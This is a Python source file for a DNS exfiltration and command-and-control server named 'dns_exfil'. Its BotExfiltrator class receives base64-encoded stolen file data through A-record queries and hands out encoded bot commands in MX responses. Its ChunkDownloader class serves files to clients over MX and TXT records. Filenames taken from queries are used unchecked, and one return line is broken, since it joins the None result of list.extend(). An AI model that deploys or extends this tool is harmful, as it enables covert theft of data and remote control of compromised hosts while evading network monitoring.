import base64
import os

from dns_exfil import config

import dnslib
from dnslib.server import DNSServer, BaseResolver
from dnslib.intercept import InterceptResolver

from socketserver import BaseRequestHandler, UDPServer

class InterceptDefaultResolver(BaseResolver):
    '''
    Base Class for specific Exfiltrator modes
    Defines default behavior, which acts as a normal DNS server
    Unusual behavior modes should be defined in a subclass of this server.
    '''
    def __init__(self):

        self.interceptor = InterceptResolver(**config['server']['upstream'])
        # link the piece of global config relevant to this instance
        context_name = type(self).__name__.lower()
        self.context = config['server'][context_name]
        super().__init__()

    def resolve(self, request, handler):
        qname = request.q.qname
        qtype = request.q.qtype
        # The QTYPE bitmaps numerical record types to it's string value
        # For example, QTYPE[15] -> 'MX'
        # See https://en.wikipedia.org/wiki/List_of_DNS_record_types
        # If a class has a method implemented by this name, we can use it
        # otherwise, we will just proxy the request upstream.
        try:
            query_resolver = getattr(self, dnslib.QTYPE[qtype])
            rdata_handler = getattr(dnslib, dnslib.QTYPE[qtype])
        except AttributeError:
            return self.interceptor.resolve(request, handler)
        question_name = str(qname)
        response = query_resolver(question_name)
        answer = dnslib.RR(question_name, qtype, rdata=rdata_handler(response), ttl=self.context['ttl'])
        reply = request.reply() 
        reply.add_answer(answer)
        return reply
        

class BotExfiltrator(InterceptDefaultResolver):
    def __init__(self):
        super().__init__()

    def A(self, name):
        '''
        This method is used to upload files to the server.
        Only the first two subdomains are important here.
        They represent the base64 encoded data and the filename
        <base64data> . <filneame> . any.domain.name.com
    
        Returns an IP based on the configuration file.
        '''
        fields = name.split('.')
        b64data = fields[0]
        filename = fields[1]
        with open(filename, 'a+b') as f:
            f.write(base64.b64decode(b64data))
        return self.context['ip']

    def MX(self, name):
        '''
        This method is used for downloading a 'command'
        which is sent down to the user in an MX record response.
        The command is stored in a file. This reads the last line of
        the file and returns the data in the first field of the domain name.
        '''
        filename = self.context['cmd']
        with open(filename) as f:
            line = f.readlines()[-1]
        encoded_command = base64.standard_b64encode(line.encode('utf-8'))
        return '.'.join([encoded_command.decode('utf-8'), name])

class ChunkDownloader(InterceptDefaultResolver):
    def __init__(self):
        super().__init__()

    def MX(self, name):
        '''
        This method is used to download files from the server
        The file is divided into chunks of configurable size,
        but the chunks must fit in a DNS packet.
        To keep things simple, the client requests the chunk size
        and chunk number. TTL should be configured very high to take
        advantage of cache.
        The format is c<c#>.s<s#>.<filename>.any.domain.name.com where c# and s# are
        the chunk number and chunk size, respectively.
        '''
        fields = name.split('.')
        chunk_num = int(fields[0][1:])
        chunk_size = int(fields[1][1:])
        filename = fields[2]
        with open(filename, 'r+b') as f:
            f.seek(chunk_num * chunk_size)
            data = f.read(chunk_size)
        encoded_data = base64.standard_b64encode(data)
        return '.'.join([encoded_data.decode('utf-8')].extend(fields[3:]))

    def TXT(self, name):
        '''
        This is the 'index' of the service.
        It it prints the names and size of the files being served.
        '''
        base = self.context['basedir']
        fileinfo = [','.join([fn, str(os.stat(fn).st_size)]) for fn in os.listdir(base)]
        index = ';'.join(fileinfo)
        return index
        
        

def start_server(resolver):
    server = DNSServer(resolver=resolver, **config['server']['service'])
    server.start()
